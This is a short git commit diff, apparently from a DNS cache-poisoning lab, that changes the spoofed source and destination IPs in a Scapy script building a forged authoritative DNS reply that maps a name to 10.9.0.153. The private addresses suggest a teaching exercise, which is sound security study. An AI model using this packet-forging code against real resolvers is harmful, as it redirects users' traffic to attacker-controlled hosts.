591e2815f01618fa7ea4eb5787f3e855b309a510
daiduongnguyen68 <64457474+daiduongnguyen68@users.noreply.github.com>
2021-05-24 09:09:53 -0700

    Fix IP

--- image_attacker_ns/Files/generate_dns_reply.py
+++ image_attacker_ns/Files/generate_dns_reply.py
@@ -10,7 +10,7 @@ Anssec = DNSRR(rrname=name, type='A', rdata='10.9.0.153', ttl=259200)
 NSsec  = DNSRR(rrname=domain, type='NS', rdata= ns, ttl=259200)
 dns    = DNS(id=0xAAAA, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=0, arcount=0,qd=Qdsec, an=Anssec)
 # Construct the IP, UDP headers, and the entire packet
-ip  = IP(dst='10.9.0.5', src='10.9.0.53', chksum=0)
+ip  = IP(dst='10.9.0.53', src='10.9.0.153', chksum=0)
 udp = UDP(dport=33333, sport=53, chksum=0)
 response = ip/udp/dns
 # Save the packet to a file
